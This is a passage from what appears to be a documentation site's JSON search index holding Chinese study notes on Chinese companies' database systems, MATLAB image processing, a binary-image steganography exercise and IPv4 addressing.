\u6269\u5bb9\u89e3\u51b3\u65b9\u6848\u2014\u2014\u5f15\u5165 JTransfer \u6a21\u5757 \u4f18\u5316SQL\u67e5\u8be2\u2014\u2014JMonitor","title":"\u65e9\u671f\u7248\u672c"},{"location":"2019\u5b66\u671f/database/\u817e\u8baf\u8682\u8681\u91d1\u670d\u4eac\u4e1c\u4f7f\u7528\u7684\u6570\u636e\u5e93/#_7","text":"\u4eac\u4e1c\u5f39\u6027\u6570\u636e\u5e93\u662f\u4e00\u4e2a\u4ea7\u54c1\u7cfb\u5217\uff0c\u4e3b\u8981\u662f\u89e3\u51b3\u6570\u636e\u5e93\u7684\u8fd0\u7ef4\u3001\u4f7f\u7528\u548c\u7814\u53d1\u8fc7\u7a0b\u4e2d\u7684\u95ee\u9898\uff0c\u5177\u5907\u52a8\u6001\u4f38\u7f29\u3001\u9ad8\u53ef\u7528\u3001\u67e5\u8be2\u900f\u660e\u8def\u7531\u3001\u96c6\u7fa4\u5316\u65e5\u5fd7\u670d\u52a1\u548c\u81ea\u52a8\u5316\u8fd0\u7ef4\u7b49\u529f\u80fd\u3002 \u4e09\u4e2a\u529f\u80fd\u6a21\u5757\uff1a","title":"\u5347\u7ea7\u5230\u5f39\u6027\u6570\u636e\u5e93"},{"location":"2019\u5b66\u671f/database/\u817e\u8baf\u8682\u8681\u91d1\u670d\u4eac\u4e1c\u4f7f\u7528\u7684\u6570\u636e\u5e93/#jed","text":"JED\u662fJProxy\u529f\u80fd\u7684\u7236\u96c6\uff0c\u5b83\u9664\u4e86\u5177\u5907\u900f\u660e\u8def\u7531\u3001\u7edf\u4e00\u5206\u5e93\u5206\u8868\u6807\u51c6\u4e4b\u5916\uff0c\u8fd8\u63d0\u4f9b\u4e86\u4e94\u5927\u529f\u80fd\uff1a","title":"JED"},{"location":"2019\u5b66\u671f/database/\u817e\u8baf\u8682\u8681\u91d1\u670d\u4eac\u4e1c\u4f7f\u7528\u7684\u6570\u636e\u5e93/#binlake","text":"BinLake\u53ea\u505a\u4e00\u6837\u5de5\u4f5c\uff1a\u96c6\u7fa4\u5316Binlog\u7684\u91c7\u96c6\u548c\u8ba2\u9605\u670d\u52a1\u3002","title":"BinLake"},{"location":"2019\u5b66\u671f/database/\u817e\u8baf\u8682\u8681\u91d1\u670d\u4eac\u4e1c\u4f7f\u7528\u7684\u6570\u636e\u5e93/#dbs","text":"DBS\u4e3b\u8981\u5b8c\u6210\u81ea\u52a8\u5316\u8fd0\u7ef4\u7684\u5de5\u4f5c\u3002\u5b83\u53ef\u4ee5\u5b8c\u6210\u6570\u636e\u5e93\u670d\u52a1\u7684\u81ea\u52a8\u5316\u4ea4\u4ed8\u3001\u6570\u636e\u5e93\u64cd\u4f5c\u7684\u6d41\u7a0b\u5316\u7ba1\u7406\u3001\u6570\u636e\u5e93\u5065\u5eb7\u6307\u6570\u5168\u9762\u76d1\u63a7\u3001\u6570\u636e\u5e93\u81ea\u52a8\u5907\u4efd\u53ca\u7ed3\u8f6c\uff0c\u4ee5\u53ca\u8c03\u5ea6\u4f5c\u4e1a\u7684\u591a\u6837\u5316\u8c03\u5ea6\uff08\u5305\u62ec\u5b9a\u65f6\u3001\u4f9d\u8d56\u4ee5\u53ca\u89e6\u53d1\u4e09\u79cd\u8c03\u5ea6\u6a21\u5f0f\uff09\u3002","title":"DBS"},{"location":"2019\u5b66\u671f/database/\u817e\u8baf\u8682\u8681\u91d1\u670d\u4eac\u4e1c\u4f7f\u7528\u7684\u6570\u636e\u5e93/#tdsql","text":"","title":"\u817e\u8baf\u2014\u2014TDSQL"},{"location":"2019\u5b66\u671f/database/\u817e\u8baf\u8682\u8681\u91d1\u670d\u4eac\u4e1c\u4f7f\u7528\u7684\u6570\u636e\u5e93/#_8","text":"\u817e\u8baf\u4e0d\u540c\u4e8e\u4e0a\u8ff0\u4e24\u5bb6\u4e92\u8054\u7f51\u4f01\u4e1a\uff0c\u5185\u90e8\u5e76\u6ca1\u6709\u53bbIOE\u7684\u8fc7\u7a0b\uff0c\u4e3b\u8981\u7684\u53d1\u5c55\u5386\u7a0b\u5982\u4e0b\uff1a","title":"\u53d1\u5c55\u5386\u7a0b"},{"location":"2019\u5b66\u671f/database/\u817e\u8baf\u8682\u8681\u91d1\u670d\u4eac\u4e1c\u4f7f\u7528\u7684\u6570\u636e\u5e93/#_9","text":"\u4e00\u5f00\u59cb\uff0c\u817e\u8baf\u4e91\u6570\u636e\u5e93\u5efa\u8bbe\u4e3b\u8981\u5f15\u5165\u4e86\u5f53\u65f6\u4e1a\u754c\u8f83\u4e3a\u4e3b\u6d41\u7684\u5f00\u6e90\u6570\u636e\u5e93\uff0c\u5982 MySQL\uff0cRedis\uff0cPostgreSQL \u7b49\u3002\u968f\u540e\u9488\u5bf9\u4e91\u4e0a\u5ba2\u6237\u5b9a\u5236\u9700\u6c42\uff0c\u817e\u8baf\u4e91\u5728\u6570\u636e\u5e93\u4e2d\u884d\u751f\u7814\u53d1\u4e86\u5982\u6570\u636e\u5e93\u5e76\u884c\u590d\u5236\u3001\u5ba1\u8ba1\u65e5\u5fd7\u3001\u5728\u7ebf\u52a0\u5b57\u6bb5\u7b49\u6838\u5fc3\u529f\u80fd\uff0c\u5e76\u8ba1\u5212\u9010\u6b65\u5c06\u4ee5\u4e0a\u529f\u80fd\u56de\u9988\u7ed9 MariaDB \u548c MySQL \u793e\u533a\u3002","title":"\u8fce\u63a5\u5f00\u6e90"},{"location":"2019\u5b66\u671f/database/\u817e\u8baf\u8682\u8681\u91d1\u670d\u4eac\u4e1c\u4f7f\u7528\u7684\u6570\u636e\u5e93/#_10","text":"\u5bf9\u4e8e\u817e\u8baf\u4e91\u81ea\u7814\u7684\u6570\u636e\u5e93\uff0c\u4e3b\u8981\u5206\u4e3a\u4e24\u7c7b\uff0c\u4e00\u7c7b\u662f \u4e3a\u817e\u8baf\u5185\u90e8\u4e1a\u52a1\u9002\u914d\u800c\u751f\u7684\u81ea\u7814\u6570\u636e\u5e93 \uff0c\u5178\u578b\u4ee3\u8868\u662f TDSQL\u3002\u53e6\u4e00\u7c7b\u662f\u57fa\u4e8e\u670d\u52a1\u6d77\u91cf\u5ba2\u6237\uff0c\u7531\u5f00\u6e90\u6570\u636e\u5e93\u9002\u914d\u4e1a\u52a1\u81ea\u4e3b\u7814\u53d1\u7684\u6570\u636e\u5e93\uff0c\u6bd4\u5982\u4f01\u4e1a\u7ea7\u4e91\u539f\u751f\u6570\u636e\u5e93 CynosDB\u3002\u5982\u679c\u8bf4\u8282\u7701\u8fd0\u7ef4\u4ee5\u53ca\u4eba\u529b\u6210\u672c\u662f\u4e91\u6570\u636e\u5e93 1.0 \u65f6\u4ee3\u7684\u7279\u5f81\uff0c\u5230\u4e86 2.0 \u65f6\u4ee3\uff0c\u4e91\u6570\u636e\u5e93\u8981\u5728\u6839\u672c\u4e0a\u5177\u5907\u81ea\u5efa\u6570\u636e\u5e93\u65e0\u6cd5\u6bd4\u62df\u7684\u4f18\u52bf\uff0c\u624d\u80fd\u6210\u4e3a\u652f\u6301\u7528\u6237\u4e1a\u52a1\u8fd0\u8f6c\u4e0d\u53ef\u64bc\u52a8\u7684\u57fa\u77f3\u3002","title":"\u5185\u90e8\u81ea\u7814"},{"location":"2019\u5b66\u671f/database/\u817e\u8baf\u8682\u8681\u91d1\u670d\u4eac\u4e1c\u4f7f\u7528\u7684\u6570\u636e\u5e93/#tdsql_1","text":"\u6574\u4f53\u6765\u8bf4\uff0cTDSQL \u662f\u7531\u51b3\u7b56\u8c03\u5ea6\u96c6\u7fa4 /GTM\uff0cSQLEngine\u3001\u6570\u636e\u5b58\u50a8\u5c42\u7b49\u6838\u5fc3\u7ec4\u4ef6\u7ec4\u6210\uff0c\u5176\u6bcf\u4e2a\u6a21\u5757\u90fd\u57fa\u4e8e\u5206\u5e03\u5f0f\u67b6\u6784\u8bbe\u8ba1\uff0c\u53ef\u4ee5\u5b9e\u73b0\u5feb\u901f\u6269\u5c55\uff0c\u65e0\u7f1d\u5207\u6362\uff0c\u5b9e\u65f6\u6545\u969c\u6062\u590d\u7b49","title":"TDSQL\u67b6\u6784"},{"location":"2019\u5b66\u671f/database/\u817e\u8baf\u8682\u8681\u91d1\u670d\u4eac\u4e1c\u4f7f\u7528\u7684\u6570\u636e\u5e93/#_11","text":"TDSQL \u5728 SQLENGINE \u5b9e\u73b0\u4e86\u57fa\u4e8e\u4ee3\u4ef7\u7684\u67e5\u8be2\u5f15\u64ce (CBO)\uff0cSQL \u7ecf\u8fc7 SQLENGINE \u7684\u8bcd\u6cd5\u3001\u8bed\u6cd5\u89e3\u6790\u3001\u8bed\u4e49\u5206\u6790\u548c SQL \u4f18\u5316\u4e4b\u540e\uff0c\u4f1a\u751f\u6210\u5206\u5e03\u5f0f\u7684\u67e5\u8be2\u8ba1\u5212\uff0c\u5e76\u6839\u636e\u6570\u636e\u8def\u7531\u7b56\u7565\uff08\u57fa\u4e8e\u4ee3\u4ef7\u7684\u67e5\u8be2\u5f15\u64ce\uff09\u8fdb\u884c\u4e0b\u63a8\u8ba1\u7b97\uff0c\u6700\u540e\u5bf9\u6c47\u603b\u7684\u6570\u636e\u8fd4\u56de\u7ed9\u524d\u7aef\u3002","title":"\u57fa\u4e8e\u89c4\u5219\u548c\u57fa\u4e8e\u4ee3\u4ef7\u7684\u67e5\u8be2\u5f15\u64ce"},{"location":"2019\u5b66\u671f/database/\u817e\u8baf\u8682\u8681\u91d1\u670d\u4eac\u4e1c\u4f7f\u7528\u7684\u6570\u636e\u5e93/#cynosdb","text":"2017\u5e74\u817e\u8baf\u4e91\u81ea\u4e3b\u7814\u53d1\u4e86\u4e00\u6b3e\u771f\u6b63\u7684\u4e91\u539f\u751f\u6570\u636e\u5e93CynosDB \u8bbe\u8ba1\u601d\u8def\uff1a \u5148\u662f\u8ba1\u7b97\u5b58\u50a8\u5206\u79bb\uff0c\u6bd4\u5982\u628a\u8fd0\u7b97 CPU \u6216\u8005\u5185\u5b58\u653e\u5728\u4e00\u8d77\u7edf\u4e00\u5206\u914d\uff0c\u53ef\u4ee5\u83b7\u5f97\u5f39\u6027\u8c03\u5ea6\u80fd\u529b\u3002 \u7b2c\u4e8c\u4e2a\u662f\u65e5\u5fd7\u4e0b\u6c89\u53ca\u5f02\u6b65\u56de\u653e\uff0c\u540c\u65f6\u79fb\u9664\u4e86\u6570\u636e\u9875\u9762\u7684\u5237\u810f\u903b\u8f91\uff0c\u8fd9\u6837\u964d\u4f4e\u4e86\u8ba1\u7b97\u5b58\u50a8\u5206\u79bb\u7684\u67b6\u6784\u4e0b\u7684\u7f51\u7edc\u5f00\u9500\u3002 \u7b2c\u4e09\u4e2a\u662f\u5206\u5e03\u5f0f\u5b58\u50a8\uff0c\u8fd9\u4e5f\u662f\u6211\u4eec\u817e\u8baf\u4e91\u81ea\u7814\u7684\u5206\u5e03\u5b58\u50a8\u7cfb\u7edf\uff0c\u5171\u4eab\u7684\u5206\u5e03\u5f0f\u5b58\u50a8\u53ef\u4ee5\u6a2a\u5411\u6269\u5c55\u3002 \u7b2c\u56db\u4e2a\u662f\u540e\u53f0\u7684\u6301\u7eed\u65e5\u5fd7\u5907\u4efd\uff0c\u4f20\u7edf\u6570\u636e\u5e93\u7684\u5907\u4efd\u662f\u5728\u6570\u636e\u5e93\u4e3b\u673a\u4e0a\u53bb\u62f7\u65e5\u5fd7\u5b8c\u6210\u5907\u4efd\uff0c\u800c CynosDB \u7684\u6301\u7eed\u5907\u4efd\u662f\u5728\u5b58\u50a8\u4e0a\u8fdb\u884c\uff0c\u4e0d\u5e72\u6270\u6570\u636e\u5e93\u5b9e\u4f8b\uff0c\u51cf\u8f7b\u7531\u4e8e\u5907\u4efd\u5bf9\u6570\u636e\u5e93\u7684\u51b2\u51fb\uff0c\u5e76\u4e14\u7528\u6237\u4e0d\u5fc5\u5173\u5fc3\u5907\u4efd\u7b56\u7565\u548c\u5907\u4efd\u5b58\u50a8\u8d44\u6e90\u89c4\u5212\u3002","title":"CynosDB"},{"location":"2019\u5b66\u671f/database/\u817e\u8baf\u8682\u8681\u91d1\u670d\u4eac\u4e1c\u4f7f\u7528\u7684\u6570\u636e\u5e93/#_12","text":"\u963f\u91cc\u6280\u672f\u5206\u4eab\uff1a\u963f\u91cc\u81ea\u7814\u91d1\u878d\u7ea7\u6570\u636e\u5e93OceanBase\u7684\u8270\u8f9b\u6210\u957f\u4e4b\u8def \u4eac\u4e1c\u5206\u5e03\u5f0f\u6570\u636e\u5e93\u7cfb\u7edf\u6f14\u8fdb\u4e4b\u8def \u6df1\u5ea6\u63ed\u79d8\u817e\u8baf\u4e91\u6570\u636e\u5e93\u6280\u672f 7 \u5e74\u53d8\u8fc1\u53f2","title":"\u53c2\u8003"},{"location":"2019\u5b66\u671f/matlab&steg/matlab\u5904\u7406\u56fe\u50cf/","text":"matlab\u5904\u7406\u56fe\u50cf \u00b6 \u5165\u95e8 \u00b6 \u5982\u4f55\u4f7f\u7528matlab\uff1f \u7f16\u5199\u811a\u672c\u7684\u65f6\u5019\u53ef\u4ee5 %% \u8fd9\u6837\u53ef\u4ee5\u8fd0\u884c\u6307\u5b9a\u7684\u8282 \u9f20\u6807\u505c\u5728\u4e00\u4e2a\u51fd\u6570\u4e0a\uff0c\u7136\u540e\u6309\u4e0b==f1==\u5c31\u4f1a\u663e\u793a\u51fd\u6570\u7684\u5e2e\u52a9 \u5904\u7406\u56fe\u7247 \u00b6 imread\u51fd\u6570 \u00b6 \u6307\u5b9a\u8def\u5f84\u6253\u5f00\u4e00\u5f20\u56fe\u7247\uff0c\u4f1a\u5c06\u56fe\u7247\u4fdd\u5b58\u62103\u7ef4\u6570\u7ec4 imshow\u51fd\u6570 \u00b6 \u5c06\u4f1a\u5c55\u793a\u8fd9\u5f20\u56fe\u7247 imtool\u51fd\u6570 \u00b6 \u53ef\u4ee5\u4f7f\u7528\u4e00\u4e9b\u5c0f\u5de5\u5177 rgb2gray \u00b6 \u8f6c\u4e3a\u7070\u5ea6\u56fe\u50cf 1 2 3 % \u53d8\u6210\u7070\u5ea6\u56fe\u50cf grayimage = rgb2gray ( I ); imshow ( grayimage ) im2bw \u00b6 im2bw\u4f7f\u7528\u9608\u503c\uff08threshold\uff09\u53d8\u6362\u6cd5\u628a\u7070\u5ea6\u56fe\u50cf\uff08grayscale image\uff09\u8f6c\u6362\u6210\u4e8c\u503c\u56fe\u50cf\u3002 \u4e00\u822c\u610f\u4e49\u4e0a\u662f\u6307\u53ea\u6709\u7eaf\u9ed1\uff080\uff09\u3001\u7eaf\u767d\uff08255\uff09\u4e24\u79cd\u989c\u8272\u7684\u56fe\u50cf\u3002 \u5f53\u7136\uff0c \u4e5f\u53ef\u4ee5\u662f\u5176\u4ed6\u4efb\u610f\u4e24\u79cd\u989c\u8272\u7684\u7ec4\u5408\u3002 \u4e86\u89e3\u4e00\u4e9b\u56fe\u50cf\u7684\u4fe1\u606f \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 %% figure ; imhist ( I (:,:, 1 )) title ( 'Histogram of the Red Band (Band 3)' ) %% r = I (:,:, 1 ); g = I (:,:, 2 ); b = I (:,:, 3 ); figure ; plot3 ( r (:), g (:), b (:), '.' ) grid ( 'on' ) xlabel ( 'Red (Band 3)' ) ylabel ( 'Green (Band 2)' ) zlabel ( 'Blue (Band 1)' ) title ( 'Scatterplot of the Visible Bands' ) %% stretched_truecoloe = imadjust ( I , stretchlim ( I )); figure imshow ( stretched_truecoloe ) title ( 'Truecolor Composite after Contrast Stretch' ) \u8fd9\u6bb5\u4ee3\u7801\u4e0d\u662f\u5f88\u61c2\u5f97\u542b\u4e49","title":"matlab\u5904\u7406\u56fe\u50cf"},{"location":"2019\u5b66\u671f/matlab&steg/matlab\u5904\u7406\u56fe\u50cf/#matlab","text":"","title":"matlab\u5904\u7406\u56fe\u50cf"},{"location":"2019\u5b66\u671f/matlab&steg/matlab\u5904\u7406\u56fe\u50cf/#_1","text":"\u5982\u4f55\u4f7f\u7528matlab\uff1f \u7f16\u5199\u811a\u672c\u7684\u65f6\u5019\u53ef\u4ee5 %% \u8fd9\u6837\u53ef\u4ee5\u8fd0\u884c\u6307\u5b9a\u7684\u8282 \u9f20\u6807\u505c\u5728\u4e00\u4e2a\u51fd\u6570\u4e0a\uff0c\u7136\u540e\u6309\u4e0b==f1==\u5c31\u4f1a\u663e\u793a\u51fd\u6570\u7684\u5e2e\u52a9","title":"\u5165\u95e8"},{"location":"2019\u5b66\u671f/matlab&steg/matlab\u5904\u7406\u56fe\u50cf/#_2","text":"","title":"\u5904\u7406\u56fe\u7247"},{"location":"2019\u5b66\u671f/matlab&steg/matlab\u5904\u7406\u56fe\u50cf/#imread","text":"\u6307\u5b9a\u8def\u5f84\u6253\u5f00\u4e00\u5f20\u56fe\u7247\uff0c\u4f1a\u5c06\u56fe\u7247\u4fdd\u5b58\u62103\u7ef4\u6570\u7ec4","title":"imread\u51fd\u6570"},{"location":"2019\u5b66\u671f/matlab&steg/matlab\u5904\u7406\u56fe\u50cf/#imshow","text":"\u5c06\u4f1a\u5c55\u793a\u8fd9\u5f20\u56fe\u7247","title":"imshow\u51fd\u6570"},{"location":"2019\u5b66\u671f/matlab&steg/matlab\u5904\u7406\u56fe\u50cf/#imtool","text":"\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e9b\u5c0f\u5de5\u5177","title":"imtool\u51fd\u6570"},{"location":"2019\u5b66\u671f/matlab&steg/matlab\u5904\u7406\u56fe\u50cf/#rgb2gray","text":"\u8f6c\u4e3a\u7070\u5ea6\u56fe\u50cf 1 2 3 % \u53d8\u6210\u7070\u5ea6\u56fe\u50cf grayimage = rgb2gray ( I ); imshow ( grayimage )","title":"rgb2gray"},{"location":"2019\u5b66\u671f/matlab&steg/matlab\u5904\u7406\u56fe\u50cf/#im2bw","text":"im2bw\u4f7f\u7528\u9608\u503c\uff08threshold\uff09\u53d8\u6362\u6cd5\u628a\u7070\u5ea6\u56fe\u50cf\uff08grayscale image\uff09\u8f6c\u6362\u6210\u4e8c\u503c\u56fe\u50cf\u3002 \u4e00\u822c\u610f\u4e49\u4e0a\u662f\u6307\u53ea\u6709\u7eaf\u9ed1\uff080\uff09\u3001\u7eaf\u767d\uff08255\uff09\u4e24\u79cd\u989c\u8272\u7684\u56fe\u50cf\u3002 \u5f53\u7136\uff0c \u4e5f\u53ef\u4ee5\u662f\u5176\u4ed6\u4efb\u610f\u4e24\u79cd\u989c\u8272\u7684\u7ec4\u5408\u3002","title":"im2bw"},{"location":"2019\u5b66\u671f/matlab&steg/matlab\u5904\u7406\u56fe\u50cf/#_3","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 %% figure ; imhist ( I (:,:, 1 )) title ( 'Histogram of the Red Band (Band 3)' ) %% r = I (:,:, 1 ); g = I (:,:, 2 ); b = I (:,:, 3 ); figure ; plot3 ( r (:), g (:), b (:), '.' ) grid ( 'on' ) xlabel ( 'Red (Band 3)' ) ylabel ( 'Green (Band 2)' ) zlabel ( 'Blue (Band 1)' ) title ( 'Scatterplot of the Visible Bands' ) %% stretched_truecoloe = imadjust ( I , stretchlim ( I )); figure imshow ( stretched_truecoloe ) title ( 'Truecolor Composite after Contrast Stretch' ) \u8fd9\u6bb5\u4ee3\u7801\u4e0d\u662f\u5f88\u61c2\u5f97\u542b\u4e49","title":"\u4e86\u89e3\u4e00\u4e9b\u56fe\u50cf\u7684\u4fe1\u606f"},{"location":"2019\u5b66\u671f/matlab&steg/\u4e8c\u503c\u56fe\u50cf\u7684\u9690\u5199/","text":"\u4e8c\u503c\u56fe\u50cf\u7684\u9690\u5199 \u00b6 \u4e8c\u503c\u56fe\u50cf\u53c8\u79f0\u4e3a\u9ed1\u767d\u56fe\u50cf\uff0c\u4e00\u822c\u75281\u62160\u8868\u793a\u9ed1\u8272\u6216\u767d\u8272\u7d20\u70b9\uff0c\u5229\u7528\u4e8c\u503c\u56fe\u50cf\u4fe1\u606f\u9690\u85cf\u7684\u65b9\u6cd5\u4e3b\u8981\u662f\u6839\u636e\u4e8c\u503c\u56fe\u50cf\u4e2d\u9ed1\u767d\u8272\u50cf\u7d20\u6570\u91cf\u7684\u6bd4\u8f83\u6765\u9690\u85cf\u4fe1\u606f\u3002 \u54c8\u5e0c\u7f6e\u6362\u6cd5 \u00b6 matlab\u5904\u7406\u5b57\u7b26\u4e32 \u00b6 \u53c8\u662f\u81ea\u5df1\u50bb\u4e86\uff0cmatlab2016a\u4e5f\u53ef\u4ee5\u521b\u5efa\u5b57\u7b26\u4e32\u7684 1 2 3 4 5 msg = 'You''re right!' name = [ 'Thomas' ' R. ' 'Lee' ] name = strcat ( 'Thomas' , ' R.' , ' Lee' ) C = char ( 'Hello' , 'Yes' , 'No' , 'Goodbye' ) S = { 'Hello' 'Yes' 'No' 'Goodbye' } compute1bi\u51fd\u6570 \u00b6 \u8ba1\u7b97\u6bcf\u4e00\u5757 p1( Bi) \u7684\u51fd\u6570 1 2 3 4 5 6 7 8 9 10 11 % headr \u4e3a\u5757\u9996\u884c\u5730\u5740 % headc \u4e3a\u5757\u9996\u5217\u5730\u5740 function p1bi = compute1bi ( headr,headc,image ) p1bi = 0 ; for i = 1 : 10 for j = 1 : 10 if image ( headr + i - 1 , headc + j - 1 ) == 1 p1bi = p1bi + 1 ; end end end \u9047\u5230\u7684\u95ee\u9898\u96c6\u4e2d\u5728\u8fd9\u91cc \u5c06\u4e00\u4e2a\u56fe\u50cf\u5206\u621010*10\u7684\u5757\uff0c\u7136\u540e binaryhide\u51fd\u6570 \u00b6 \u8fd9\u4e2a\u662f\u9690\u5199\u8fd9\u4e2a\u7a0b\u5e8f\u7684\u5165\u53e3 1","title":"\u4e8c\u503c\u56fe\u50cf\u7684\u9690\u5199"},{"location":"2019\u5b66\u671f/matlab&steg/\u4e8c\u503c\u56fe\u50cf\u7684\u9690\u5199/#_1","text":"\u4e8c\u503c\u56fe\u50cf\u53c8\u79f0\u4e3a\u9ed1\u767d\u56fe\u50cf\uff0c\u4e00\u822c\u75281\u62160\u8868\u793a\u9ed1\u8272\u6216\u767d\u8272\u7d20\u70b9\uff0c\u5229\u7528\u4e8c\u503c\u56fe\u50cf\u4fe1\u606f\u9690\u85cf\u7684\u65b9\u6cd5\u4e3b\u8981\u662f\u6839\u636e\u4e8c\u503c\u56fe\u50cf\u4e2d\u9ed1\u767d\u8272\u50cf\u7d20\u6570\u91cf\u7684\u6bd4\u8f83\u6765\u9690\u85cf\u4fe1\u606f\u3002","title":"\u4e8c\u503c\u56fe\u50cf\u7684\u9690\u5199"},{"location":"2019\u5b66\u671f/matlab&steg/\u4e8c\u503c\u56fe\u50cf\u7684\u9690\u5199/#_2","text":"","title":"\u54c8\u5e0c\u7f6e\u6362\u6cd5"},{"location":"2019\u5b66\u671f/matlab&steg/\u4e8c\u503c\u56fe\u50cf\u7684\u9690\u5199/#matlab","text":"\u53c8\u662f\u81ea\u5df1\u50bb\u4e86\uff0cmatlab2016a\u4e5f\u53ef\u4ee5\u521b\u5efa\u5b57\u7b26\u4e32\u7684 1 2 3 4 5 msg = 'You''re right!' name = [ 'Thomas' ' R. ' 'Lee' ] name = strcat ( 'Thomas' , ' R.' , ' Lee' ) C = char ( 'Hello' , 'Yes' , 'No' , 'Goodbye' ) S = { 'Hello' 'Yes' 'No' 'Goodbye' }","title":"matlab\u5904\u7406\u5b57\u7b26\u4e32"},{"location":"2019\u5b66\u671f/matlab&steg/\u4e8c\u503c\u56fe\u50cf\u7684\u9690\u5199/#compute1bi","text":"\u8ba1\u7b97\u6bcf\u4e00\u5757 p1( Bi) \u7684\u51fd\u6570 1 2 3 4 5 6 7 8 9 10 11 % headr \u4e3a\u5757\u9996\u884c\u5730\u5740 % headc \u4e3a\u5757\u9996\u5217\u5730\u5740 function p1bi = compute1bi ( headr,headc,image ) p1bi = 0 ; for i = 1 : 10 for j = 1 : 10 if image ( headr + i - 1 , headc + j - 1 ) == 1 p1bi = p1bi + 1 ; end end end \u9047\u5230\u7684\u95ee\u9898\u96c6\u4e2d\u5728\u8fd9\u91cc \u5c06\u4e00\u4e2a\u56fe\u50cf\u5206\u621010*10\u7684\u5757\uff0c\u7136\u540e","title":"compute1bi\u51fd\u6570"},{"location":"2019\u5b66\u671f/matlab&steg/\u4e8c\u503c\u56fe\u50cf\u7684\u9690\u5199/#binaryhide","text":"\u8fd9\u4e2a\u662f\u9690\u5199\u8fd9\u4e2a\u7a0b\u5e8f\u7684\u5165\u53e3 1","title":"binaryhide\u51fd\u6570"},{"location":"2019\u5b66\u671f/network/ip\u5730\u5740/","text":"ip\u5730\u5740 \u00b6 ipv4 \u5730\u5740\u683c\u5f0f \u00b6 IPv4\u5730\u5740\u53ef\u88ab\u5199\u4f5c\u4efb\u4f55\u8868\u793a\u4e00\u4e2a32\u4f4d\u6574\u6570\u503c\u7684\u5f62\u5f0f\uff0c\u4f46\u4e3a\u4e86\u65b9\u4fbf\u4eba\u7c7b\u9605\u8bfb\u548c\u5206\u6790\uff0c\u5b83\u901a\u5e38\u88ab\u5199\u4f5c \u70b9\u5206\u5341\u8fdb\u5236 \u7684\u5f62\u5f0f\uff0c\u5373\u56db\u4e2a\u5b57\u8282\u88ab\u5206\u5f00\u7528 \u5341\u8fdb\u5236 \u5199\u51fa\uff0c\u4e2d\u95f4\u7528\u70b9\u5206\u9694\u3002 \u4e0b\u8868\u5c55\u793a\u4e86\u51e0\u79cd\u4e0d\u540c\u7684\u683c\u5f0f\uff1a \u683c\u5f0f \u503c \u4ece\u70b9\u5206\u5341\u8fdb\u5236\u8f6c\u6362 \u70b9\u5206\u5341\u8fdb\u5236 192.0.2.235 \u4e0d\u9002\u7528 \u70b9\u5206\u5341\u516d\u8fdb\u5236[ 2] 0xC0.0x00.0x02.0xEB \u6bcf\u4e2a\u5b57\u8282\u88ab\u5355\u72ec\u8f6c\u6362\u4e3a\u5341\u516d\u8fdb\u5236 \u70b9\u5206\u516b\u8fdb\u5236[ 2] 0300.0000.0002.0353 \u6bcf\u4e2a\u5b57\u8282\u88ab\u5355\u72ec\u8f6c\u6362\u4e3a\u516b\u8fdb\u5236 \u5341\u516d\u8fdb\u5236 0xC00002EB \u5c06\u70b9\u5206\u5341\u516d\u8fdb\u5236\u8fde\u5728\u4e00\u8d77 \u5341\u8fdb\u5236 3221226219 \u7528\u5341\u8fdb\u5236\u5199\u51fa\u768432\u4f4d\u6574\u6570 \u516b\u8fdb\u5236 030000001353 \u7528\u516b\u8fdb\u5236\u5199\u51fa\u768432\u4f4d\u6574\u6570 \u5206\u914d \u00b6 \u6700\u521d\uff0c\u4e00\u4e2aIP\u5730\u5740\u88ab\u5206\u6210\u4e24\u90e8\u5206\uff1a\u7f51\u7edc\u6807\u8bc6\u7b26\u5728\u5730\u5740\u7684\u9ad8\u4f4d\u5b57\u8282\u4e2d\uff0c\u4e3b\u673a\u6807\u8bc6\u7b26\u5728\u5269\u4e0b\u7684\u90e8\u5206\u4e2d\u3002 \u4e3a\u4e86\u514b\u670d\u8fd9\u4e2a\u9650\u5236\uff0c\u5728\u968f\u540e\u51fa\u73b0\u7684 \u5206\u7c7b\u7f51\u7edc \u4e2d\uff0c\u5730\u5740\u7684\u9ad8\u4f4d\u5b57\u8282\u88ab\u91cd\u5b9a\u4e49\u4e3a\u7f51\u7edc\u7684 \u7c7b (Class)\u3002\u8fd9\u4e2a\u7cfb\u7edf\u5b9a\u4e49\u4e86\u4e94\u4e2a\u7c7b\u522b\uff1aA\u3001B\u3001C\u3001D\u548cE\u3002A\u3001B\u548cC\u7c7b\u6709\u4e0d\u540c\u7684\u7f51\u7edc\u7c7b\u522b\u957f\u5ea6\uff0c\u5269\u4f59\u7684\u90e8\u5206\u88ab\u7528\u6765\u8bc6\u522b\u7f51\u7edc\u5185\u7684\u4e3b\u673a\uff0c\u8fd9\u5c31\u610f\u5473\u7740\u6bcf\u4e2a\u7f51\u7edc\u7c7b\u522b\u6709\u7740\u4e0d\u540c\u7684\u7ed9\u4e3b\u673a\u7f16\u5740\u7684\u80fd\u529b\u3002D\u7c7b\u88ab\u7528\u4e8e \u591a\u64ad \u5730\u5740\uff0cE\u7c7b\u88ab\u7559\u4f5c\u5c06\u6765\u4f7f\u7528\u3002 \u524d8\u4f4d\u5730\u5740\u8303\u56f4 \u7c7b \u8def\u7531\u5f62\u5f0f \u5360\u5730\u5740\u603b\u7a7a\u95f4\u7684\u6bd4\u4f8b \u9ed8\u8ba4\u63a9\u7801 \u7f51\u7edc\u8303\u56f4 0-127 A \u5355\u64ad \u00bd 255.0.0.0/8 0-127.x.x.x 128-191 B \u5355\u64ad \u00bc 255.255.0.0/16 255.255.0.0/16 192-223 C \u5355\u64ad \u215b 255.255.255.0/24 255.255.255.0/24 224-239 D \u591a\u64ad 1/16 240-255 E \u79d1\u7814\u4fdd\u7559 1/16 \u5176\u4e2d A\u7c7b\u5730\u5740\uff1a \u7b2c1\u4e2a8\u4f4d\u4e2d\u7684\u7b2c1\u4f4d\u59cb\u7ec8\u4e3a0 B\u7c7b\u5730\u5740\uff1a\u7b2c1\u4e2a8\u4f4d\u4e2d\u7684\u7b2c1\u30012\u4f4d\u59cb\u7ec8\u4e3a10 C\u7c7b\u5730\u5740\uff1a\u7b2c1\u4e2a8\u4f4d\u4e2d\u7684\u7b2c1\u30012\u30013\u4f4d\u59cb\u7ec8\u4e3a110 1 IP\u5730\u5740\u5305\u542b \u7f51\u7edc\u5730\u5740+\u4e3b\u673a\u5730\u5740\uff0c\u5373IP\u5730\u5740=\u7f51\u7edc\u5730\u5740+\u4e3b\u673a\u5730\u5740 